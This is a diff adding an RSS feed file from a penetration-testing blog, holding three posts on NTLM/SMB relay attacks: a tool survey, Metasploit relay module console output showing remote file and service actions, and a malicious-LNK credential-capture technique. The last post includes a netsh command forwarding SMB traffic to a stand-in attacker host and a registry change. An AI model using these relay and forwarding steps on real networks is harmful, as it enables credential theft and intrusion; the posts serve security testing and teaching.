@@ -1,0 +1,277 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Smbrelay on Room362</title>
+    <link>http://room362.com/categories/smbrelay/</link>
+    <description>Recent content in Smbrelay on Room362</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
+    <lastBuildDate>Wed, 21 May 2014 17:16:37 -0400</lastBuildDate>
+    <atom:link href="http://room362.com/categories/smbrelay/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Effective NTLM / SMB Relaying</title>
+      <link>http://room362.com/post/2014/2014-05-21-effective-ntlm-slash-smb-relaying/</link>
+      <pubDate>Wed, 21 May 2014 17:16:37 -0400</pubDate>
+      
+      <guid>http://room362.com/post/2014/2014-05-21-effective-ntlm-slash-smb-relaying/</guid>
+      <description>
+
+&lt;p&gt;&lt;a href=&#34;http://en.wikipedia.org/wiki/SMBRelay&#34;&gt;SMB Relay&lt;/a&gt; has been around for a long while. I even have a post about using it along with LNK files here: &lt;a href=&#34;http://room362.com/blog/2012/02/11/ms08_068-ms10_046-fun-until-2018/&#34;&gt;MS08-068 + MS10-046 = Fun until 2018&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Here is the problem though. Most of the tools to exploit it either catch the authentication in NTLMv2/NTLMv1 (which is not always easy to crack) or assume administrative access (because they attempt to PSEXEC with the incoming session). Well, since MS08-068 thats much harder to pin down. You have to know who is going to hit your relay server and what other location they might be an admin on. You also have to a service you want to run on that target.&lt;/p&gt;
+
+&lt;h3 id=&#34;current-tools:101ca14799cbfb3dc70715a9b42525cd&#34;&gt;Current Tools:&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.xfocus.net/articles/200305/smbrelay.html&#34;&gt;SMBRelay&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.tarasco.org/security/smbrelay/&#34;&gt;SMBRelay3&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/SpiderLabs/Responder&#34;&gt;SpiderLabs Responder&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://corelabs.coresecurity.com/index.php?module=Wiki&amp;amp;action=view&amp;amp;type=tool&amp;amp;name=Impacket&#34;&gt;SMBRelayX in Impacket&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/server/http_ntlmrelay.rb&#34;&gt;HTTP NTLM Relay Metasploit Module&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/smb_relay.rb&#34;&gt;SMB Relay PSExec Metasploit Module&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/oracle/ora_ntlm_stealer.rb&#34;&gt;Oracle SMB Relay Metasploit Module&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/sap/sap_smb_relay.rb&#34;&gt;SAP SMB Relay Metasploit Module&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;soft-relay-tools:101ca14799cbfb3dc70715a9b42525cd&#34;&gt;&amp;ldquo;Soft&amp;rdquo; relay tools:&lt;/h3&gt;
+
+&lt;p&gt;Now, some would argue that you just spin up the relay at a target then leave it until one pops. I&amp;rsquo;m not really a fan of that. You will not only be creating multiple access attempt log entries, but you are also just throwing away all of those user authentication attempts. There are 3 tools that agree with me.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&#34;https://code.google.com/p/squirtle/&#34;&gt;Squirtle&lt;/a&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Squirtle is awesome plus it&amp;rsquo;s written in a language I understand (ruby) but it has one serious downfall, many of the post-auth features are left up to the user to develop. It does have a great API but needs some coding to get to do certain things.&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://intercepter.nerf.ru/&#34;&gt;Intercepter-NG&lt;/a&gt;
+
+&lt;ul&gt;
+&lt;li&gt;I have tested Interceptre-NG out a lot and it has some fantastic features, not to mention that it does relaying on a Windows host, which is impressive all by itself (due to 445 default bind). My only problem with it is that it&amp;rsquo;s closed source. But definitely recommended.&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The 3rd is a tool called &amp;ldquo;ZackAttack&amp;rdquo; by &lt;a href=&#34;https://twitter.com/zfasel&#34;&gt;Zack Fasel&lt;/a&gt;, you can find it here on &lt;a href=&#34;https://github.com/urbanesec/ZackAttack&#34;&gt;Github:ZackAttack&lt;/a&gt;. You can find the video of the talk releasing this tool on &lt;a href=&#34;https://www.youtube.com/watch?v=nHU3ujyw_sQ&#34;&gt;Youtube&lt;/a&gt;. So what is so special about this tool? Other than the fact that most of the web interface is broken horribly it has this amazing bit of code that acts as a SOCKS proxy. This SOCKS proxy identifies SMB or HTTP traffic that has NTLM authentication going on and rewrites it based on captured sessions.&lt;/p&gt;
+
+&lt;p&gt;What does this mean? If I use SpiderLab&amp;rsquo;s Responder, for instance, to spoof/get/fake a bunch of users into connecting to my machine via automatic or forced methods to the capture/keep services that ZackAttack spins up, I can then run smbclient or Outlook or Web browser, push it through the ZackAttack SOCKS proxy, pick a username out of the captured names, and use any password I want when asked, and the SOCKS proxy will automatically replace it en route with the valid session information.&lt;/p&gt;
+
+&lt;p&gt;This way I can use every authentication that comes in to its highest potential for pwnage. The video below shows how this can be used to connect to a &amp;ldquo;Network share&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Update: One thing to mention that ZackAttack does that I haven&amp;rsquo;t seen other tools do, even Squirtle or Intercepter-NG is getting 3+ successful authentications out of a single relay from a user. ZackAttack does this with some clever HTTP Keep-Alive and SMB &amp;ldquo;reauth&amp;rdquo; kung fu.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;iframe width=&#34;420&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/05W5tUG7z2M&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;
+
+&lt;h3 id=&#34;other-references:101ca14799cbfb3dc70715a9b42525cd&#34;&gt;Other References:&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;http://blog.spiderlabs.com/2014/02/responder-20-owning-windows-networks-part-3.html&#34;&gt;2014-02 &lt;strong&gt;SpiderLabs&lt;/strong&gt; - Responder 2.0 Owning Windows Networks Part 3&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.netspi.com/blog/entryid/213/smb-attacks-through-directory-traversal&#34;&gt;2014-01 &lt;strong&gt;NetSPI Blog&lt;/strong&gt; - SMB Attacks Through Directory Traversal&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://intercepter.nerf.ru/SMB_Hijacking.Kerberos_is_defeated.pdf&#34;&gt;2013-06 &lt;strong&gt;Ares&lt;/strong&gt; - SMB Hijacking Kerberos is defeated&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://pen-testing.sans.org/blog/pen-testing/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python&#34;&gt;2013-04 &lt;strong&gt;SANS Pentesting Blog&lt;/strong&gt; - SMB Relay Demystified and NTLMv2 Pwnage with Python&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.screencast.com/users/Core_Security/folders/Training%20Videos%20for%20CORE%20Impact%20Pro/media/c48247ab-1f0b-4e86-a78a-1d7e347c0989&#34;&gt;2013-01 &lt;strong&gt;Core Security Training Video&lt;/strong&gt; - How To Perform a SMB Relay Attack&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://markgamache.blogspot.com/2013/01/ntlm-challenge-response-is-100-broken.html&#34;&gt;2013-01 &lt;strong&gt;Mark Gamache&lt;/strong&gt; - NTLM Challenge Response is 100% Broken&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.netspi.com/blog/entryid/139/executing-smb-relay-attacks-via-sql-server-using-metasploit&#34;&gt;2012-12 &lt;strong&gt;NetSPI Blog&lt;/strong&gt; - Executing SMB Relay Attacks via SQL Server using Metasploit&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://webstersprodigy.net/2012/07/22/metasploit-generic-ntlm-relay-module/&#34;&gt;2012-07 &lt;strong&gt;WebstersProdigy&lt;/strong&gt; - Metasploit Generic NTLM Relay Module&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://intercepter.nerf.ru/Actuality_of_SMBRelay_in_Modern_Windows_Networks.pdf&#34;&gt;2012-04 &lt;strong&gt;Ares&lt;/strong&gt; - Actuality of SMBRelay in Modern Windows Networks&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://erpscan.com/?s=smbrelay+bible&amp;amp;x=0&amp;amp;y=0&#34;&gt;2011-01 &lt;strong&gt;Digital Security Research Group Blog&lt;/strong&gt; - SMBRelay Bible&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://vimeo.com/5500931&#34;&gt;2009-07 &lt;strong&gt;Carnal0wnage&lt;/strong&gt; - Metasploit Oracle TNSCMD SMBRelay Demo&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://blog.skullsecurity.org/2008/ms08-068-preventing-smbrelay-attacks&#34;&gt;2008-11 &lt;strong&gt;Ron Bowes&lt;/strong&gt; - Preventing SMB Relay Attacks&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://squirtle.googlecode.com/files/NTLM%20is%20Dead%20-%20DefCon%2016.pdf&#34;&gt;2008-08 &lt;strong&gt;Kurt Grutzmacher at DEF CON 16&lt;/strong&gt; - NTLM is Dead!&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://heasman.blogspot.com/2008/06/stealing-password-hashes-with-java-and.html&#34;&gt;2008-06 &lt;strong&gt;John Heasman&lt;/strong&gt; - Stealing Password Hashes with Java and IE&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.powershow.com/view/28526-OWZjN/NTLM_Relay_Attacks_powerpoint_ppt_presentation&#34;&gt;2008-04 &lt;strong&gt;Eric Rachner: NTLM Relay Attacks&lt;/strong&gt; - Released tool &amp;lsquo;scurvy&amp;rsquo;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/presentations/bh-usa-07/Moore_and_Valsmith/Presentation/bh-usa-07-moore_and_valsmith.pdf&#34;&gt;2007-08 &lt;strong&gt;HD Moore and Valsmith&lt;/strong&gt; - Tactical Exploitation&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20060719183135/http://www.isecpartners.com/documents/NTLM_Unsafe.pdf&#34;&gt;2004-12 (ARCHIVE.ORG) &lt;strong&gt;Jesse Burns at SySCAN&lt;/strong&gt; - NTLM Authentication Unsafe&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.securityfriday.com/tools/ScoopLM.html&#34;&gt;2002-01 &lt;strong&gt;Azbil SecurityFriday Ltd&lt;/strong&gt; - ScoopLM&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.xfocus.net/articles/200305/smbrelay.html&#34;&gt;2001-03 &lt;strong&gt;@lantaCon&lt;/strong&gt; - Reference from &lt;strong&gt;March 31 2001 talk&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I tried finding all the original/semi original references about SMB (LM/NTLM) Relaying. If you have others please leave a comment below so I can add them to the list.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Cross-Protocol Chained Pass the Hash for Metasploit</title>
+      <link>http://room362.com/post/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/</link>
+      <pubDate>Tue, 10 Jul 2012 06:02:40 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/</guid>
+      <description>&lt;p&gt;Every so often someone writes a Metasploit Module that is pretty epic. Today is one such day:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201207_pth_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Twitter Link: &lt;a href=&#34;https://twitter.com/webstersprodigy/status/222529916783169536&#34;&gt;https://twitter.com/webstersprodigy/status/222529916783169536&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Which has a link to here: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/589&#34;&gt;https://github.com/rapid7/metasploit-framework/pull/589&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Demo / Example resource files: &lt;a href=&#34;https://skydrive.live.com/?cid=19794fac33285fd5&amp;amp;resid=19794FAC33285FD5!170&amp;amp;id=19794FAC33285FD5%21170&#34;&gt;https://skydrive.live.com/?cid=19794fac33285fd5&amp;amp;resid=19794FAC33285FD5!170&amp;amp;id=19794FAC33285FD5%21170&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;You can pull the fork w/ branch from here: &lt;a href=&#34;https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay&#34;&gt;https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;And as soon as you do you can start doing this (&lt;strong&gt;&lt;em&gt;using the example resource file to put a file, cat it out, enum shares available, list files on a share, then psexec all from a single URL being loaded&lt;/em&gt;&lt;/strong&gt;):&lt;/p&gt;
+
+&lt;p&gt;163 address is the Victim I tricked into loading a URL and 182 is the system I want to get onto. This is an HTTP request resulting in a SMB Relay&amp;rsquo;d auth. It looks as though multiple targets can be used as relay targets but I haven&amp;rsquo;t tested this out yet.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_put&#39; from 172.16.10.163:52327
+[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+[*] 172.16.10.163 http_ntlmrelay - File \\172.16.10.182\c$\secret.txt written
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_get&#39; from 172.16.10.163:52328
+[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+[*] 172.16.10.163 http_ntlmrelay - Reading 13 bytes from 172.16.10.182
+[*] 172.16.10.163 http_ntlmrelay - ----Contents----
+[*] 172.16.10.163 http_ntlmrelay - hi ima secret
+[*] 172.16.10.163 http_ntlmrelay - ----End Contents----
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_enum&#39; from 172.16.10.163:52329
+[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+[*] 172.16.10.163 http_ntlmrelay - Shares enumerated 172.16.10.182 IPC$ ADMIN$ C$
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_ls&#39; from 172.16.10.163:52330
+[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+[*] 172.16.10.163 http_ntlmrelay - Listed 13 files from 172.16.10.182c$
+[*] 172.16.10.163 http_ntlmrelay - .rnd
+[*] 172.16.10.163 http_ntlmrelay - PerfLogs
+[*] 172.16.10.163 http_ntlmrelay - config.sys
+[*] 172.16.10.163 http_ntlmrelay - inetpub
+[*] 172.16.10.163 http_ntlmrelay - xampp
+[*] 172.16.10.163 http_ntlmrelay - ProgramData
+[*] 172.16.10.163 http_ntlmrelay - MSOCache
+[*] 172.16.10.163 http_ntlmrelay - secret.txt
+[*] 172.16.10.163 http_ntlmrelay - autoexec.bat
+[*] 172.16.10.163 http_ntlmrelay - Windows
+[*] 172.16.10.163 http_ntlmrelay - Users
+[*] 172.16.10.163 http_ntlmrelay - Program Files
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_rm&#39; from 172.16.10.163:52332
+[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+[*] 172.16.10.163 http_ntlmrelay - File \\172.16.10.182\c$\secret.txt deleted
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_pwn&#39; from 172.16.10.163:52333
+[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+[*] 172.16.10.163 http_ntlmrelay - Obtraining a service manager handle...
+[*] 172.16.10.163 http_ntlmrelay - Creating a new service
+[*] 172.16.10.163 http_ntlmrelay - Closing service handle...
+[*] 172.16.10.163 http_ntlmrelay - Opening service...
+[*] 172.16.10.163 http_ntlmrelay - Starting the service...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Let the fun begin&amp;hellip;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>MS08_068 &#43; MS10_046 = FUN UNTIL 2018</title>
+      <link>http://room362.com/post/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/</link>
+      <pubDate>Sat, 11 Feb 2012 08:29:37 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/</guid>
+      <description>
+
+&lt;p&gt;*&lt;strong&gt;&lt;em&gt;TL;DR:&lt;/em&gt;&lt;/strong&gt;* SMB Relay + LNK UNC icons = internal pentest pwnage&lt;/p&gt;
+
+&lt;p&gt;I need to touch on the highlights of two vulnerabilities before we talk about the fun stuff, but I highly encourage you to read the references at the bottom of this post and understand the vulnerabilities after you are done with my little trick, as you might find one of your own.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;MS08_068:&lt;/strong&gt; &lt;a href=&#34;http://www.cvedetails.com/cve/CVE-2008-4037/&#34;&gt;http://www.cvedetails.com/cve/CVE-2008-4037/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;In 2008, Microsoft released MS08_068 which patched the &amp;ldquo;SMB Relay&amp;rdquo; attack. To boil this down, an attacker gets a victim to attempt to authenticate to an attacker controlled box. The attack delays its responses to the victim and replays the important parts of the authentication that the victim sent back at the victim. You can find out a lot more about this vulnerability here: &lt;a href=&#34;https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay&#34;&gt;https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;One thing to take away from that post is that the patch stops Attacker &amp;lt;=&amp;gt; Victim, but does not / cannot fix Victim &amp;lt;=&amp;gt; Attacker &amp;lt;=&amp;gt; &lt;strong&gt;Victim2&lt;/strong&gt; (use authentication from Victim to replay to Victim2)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;MS10_046:&lt;/strong&gt; &lt;a href=&#34;http://www.cvedetails.com/cve/CVE-2010-2568/&#34;&gt;http://www.cvedetails.com/cve/CVE-2010-2568/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;In 2010, Microsoft released MS10_046 which patched the Stuxnet LNK vulnerability where a malicious DLL could be loaded (locally or remotely over WebDAV) using the path of the shortcut&amp;rsquo;s icon reference. LNK files are Windows shortcut files that allow the icons of the files to be changed much more dynamically than any other file type (Right click a shortcut, go to Properties, and just simply click the &amp;lsquo;Change Icon&amp;rsquo; button). I could certainly be wrong here, but I believe all Microsoft patched was the ability to use this feature to load the DLLs via a certain Control Panel object. Which leaves the ability to load shortcut (LNK) icons from wherever we wish. ;-)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;The Setup:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;If you are on an internal penetration test and either exploit a machine or find an open share, you can create an LNK file with an icon that points at a nonexistent share on your attacking machine&amp;rsquo;s IP and use SMB_Relay to replay those credentials to a system in which we&amp;rsquo;ve identified by one means or another as an &amp;lsquo;important&amp;rsquo; host to get on.&lt;/p&gt;
+
+&lt;p&gt;Attacker uploads malicious LNK file to network share on &lt;strong&gt;FILE SHARE&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Victim views it on &lt;strong&gt;WORKSTATION&lt;/strong&gt; that initiates an connection to &lt;strong&gt;ATTACKER&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Attacker relays those authentication attempts to &lt;strong&gt;FILE SHARE&lt;/strong&gt;, gaining code execution if &amp;lsquo;Victim&amp;rsquo; is an admin on &lt;strong&gt;FILE SHARE&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;If not, then NetNTLM are still visible in the logs and can be attempted to crack, or just wait for more people to view the LNK file on the public share, and hope that an admin comes by at some point.&lt;/p&gt;
+
+&lt;p&gt;Your mileage will vary based on where you put the LNK file.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;The Video:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;center&gt;&lt;iframe align=center width=&#34;560&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/FxekUPY5ojU&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;/p&gt;
+
+&lt;p&gt;I have created a post module to automate the process of creating and uploading the LNK file (so you don&amp;rsquo;t have to have a Windows box lying around). Here it is in action:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Module options (post/windows/escalate/droplnk):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   ICONFILENAME  icon.png         yes       File name on LHOST&#39;s share
+   LHOST         192.168.2.16     yes       Host listening for incoming SMB/WebDAV traffic
+   LNKFILENAME   Words.lnk        yes       Shortcut&#39;s filename
+   SESSION       1                yes       The session to run this module on.
+   SHARENAME     share1           yes       Share name on LHOST
+
+2012-02-11 07:17:19 +0000 2 1 post(droplnk) &amp;gt; run
+
+[*] Creating evil LNK
+[*] Done. Writing to disk - C:\DocuMe~1\Administrator\Words.lnk
+[*] Done. Wait for evil to happen..
+[*] Post module execution completed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You can find the code here:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/mubix/Not-In-Pentesting-Class/blob/master/modules/post/mubix/droplnk.rb&#34;&gt;https://github.com/mubix/Not-In-Pentesting-Class/blob/master/modules/post/mubix/droplnk.rb&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Going forward:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Obviously this isn&amp;rsquo;t so effective remotely out of the box and there currently isn&amp;rsquo;t a SMB_Relay for WebDAV (although I&amp;rsquo;m guessing that would work). However I was able to construct a crude way getting smb_relaying working using some pretty loud system changes to an exploited host:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Step 1&lt;/strong&gt;: Disable SMB on Port 445 (it will still operate on 139 as it is a failover), this setting requires a reboot to take effect and can be done using the following command:&lt;br /&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;reg add HKLM\System\CurrentControlSet\Services\NetBTParameters /v SMBDeviceEnabled /t REG_DWORD /d 0&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Step 2&lt;/strong&gt;: Port forward the traffic out to your remote attacker host over a port that is allowed out, used 80:
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;netsh int portproxy v4tov4 listenport=445 connectaddress=the.bad.guy.com connectport=80&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Step 3&lt;/strong&gt;: Set up SMB_Relay listening on that port on your attacker with a route in meterpreter to send all relayed authentication through your meterpreter session into and at the targeted host.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;These steps can get you noticed in almost every way, so it&amp;rsquo;s not recommended, I just did it as a PoC. I mean how cool is it to remotely exploit SMB vulns ;-)&lt;/p&gt;
+
+&lt;p&gt;The other thing is, administrators are becoming much more rare as years move along and people use lower priv users for their daily tasks, so there are currently feature requests in to the Metasploit project to make it so when you get SMB_Relay correctly forwarding good credentials, even if they aren&amp;rsquo;t admin and you cannot get code execution it would be nice to be able to go through the files that person has access to on the targeted system / file share. A final pipe dream of this post is to have a multi-threaded smb_relay that 2, 3 or even 10 servers can be targeted with the relayed authentication.&lt;/p&gt;
+
+&lt;p&gt;just saying&amp;rsquo;…. /me nudges the Metasploit devs…&lt;/p&gt;
+
+&lt;h3 id=&#34;references:c80e212dfa3f33a40ad11a42493d3ad7&#34;&gt;References:&lt;/h3&gt;
+
+&lt;h4 id=&#34;smb-relay-references:c80e212dfa3f33a40ad11a42493d3ad7&#34;&gt;SMB_Relay References:&lt;/h4&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&amp;ldquo;Initial?&amp;rdquo; release in 2003 - &lt;a href=&#34;http://www.xfocus.net/articles/200305/smbrelay.html&#34;&gt;http://www.xfocus.net/articles/200305/smbrelay.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Microsoft advisory - &lt;a href=&#34;http://technet.microsoft.com/en-us/security/bulletin/ms08-068&#34;&gt;http://technet.microsoft.com/en-us/security/bulletin/ms08-068&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Metasploit blog post - &lt;a href=&#34;https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay&#34;&gt;https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Metasploit module - &lt;a href=&#34;http://www.metasploit.com/modules/exploit/windows/smb/smb_relay&#34;&gt;http://www.metasploit.com/modules/exploit/windows/smb/smb_relay&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&#34;lnk-dll-loader-references:c80e212dfa3f33a40ad11a42493d3ad7&#34;&gt;LNK DLL Loader References:&lt;/h4&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Microsoft advisory - &lt;a href=&#34;http://technet.microsoft.com/en-us/security/advisory/2286198&#34;&gt;http://technet.microsoft.com/en-us/security/advisory/2286198&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Metasploit blog post - &lt;a href=&#34;https://community.rapid7.com/community/infosec/blog/2010/08/05/ms10-046-a-rude-awakening&#34;&gt;https://community.rapid7.com/community/infosec/blog/2010/08/05/ms10-046-a-rude-awakening&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Some of HDM&amp;rsquo;s research - &lt;a href=&#34;https://community.rapid7.com/community/solutions/metasploit/blog/2010/08/22/exploiting-dll-hijacking-flaws&#34;&gt;https://community.rapid7.com/community/solutions/metasploit/blog/2010/08/22/exploiting-dll-hijacking-flaws&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;ISS&amp;rsquo;s advisory - &lt;a href=&#34;http://blogs.iss.net/archive/remotedllpreloadingv.html&#34;&gt;http://blogs.iss.net/archive/remotedllpreloadingv.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Metasploit module - &lt;a href=&#34;http://www.metasploit.com/modules/exploit/windows/browser/ms10_046_shortcut_icon_dllloader&#34;&gt;http://www.metasploit.com/modules/exploit/windows/browser/ms10_046_shortcut_icon_dllloader&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Video of the module in action - &lt;a href=&#34;http://www.commonexploits.com/?p=151&#34;&gt;http://www.commonexploits.com/?p=151&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
